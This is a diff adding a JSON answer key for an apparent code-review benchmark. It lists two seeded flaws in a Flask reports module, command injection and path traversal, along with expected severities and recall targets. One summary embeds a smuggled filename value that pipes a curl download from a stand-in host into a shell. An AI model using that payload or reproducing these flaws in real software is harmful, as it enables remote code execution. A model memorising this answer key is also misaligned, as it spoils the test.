@@ -1,0 +1,37 @@
+{
+  "fixture": "py-injection",
+  "kind": "seeded",
+  "notes": "Flask blueprint adding report download and pandoc export endpoints behind an API key. No test setup, so one 'repo has no test setup' finding (medium, severity.md fixed rule 1) is expected and REAL. Also acceptable if raised: export source/output can contain '../' (same unsafe input as PI1; label real if reported separately).",
+  "targets": {
+    "recall": 0.7,
+    "high_plus_recall": 0.9
+  },
+  "defects": [
+    {
+      "id": "PI1",
+      "summary": "Command injection: request-supplied source is interpolated into a shell=True pandoc command; a source like 'x;curl evil|sh;.md' runs arbitrary commands",
+      "lenses": [
+        "security"
+      ],
+      "severity": "critical",
+      "location": {
+        "file": "src/reports/views.py",
+        "start_line": 44,
+        "end_line": 46
+      }
+    },
+    {
+      "id": "PI2",
+      "summary": "Path traversal: download joins the user-supplied file parameter onto REPORTS_DIR with no normalization or containment check, so ../ or absolute paths read any file the process can read",
+      "lenses": [
+        "security"
+      ],
+      "severity": "high",
+      "location": {
+        "file": "src/reports/views.py",
+        "start_line": 24,
+        "end_line": 24
+      }
+    }
+  ]
+}
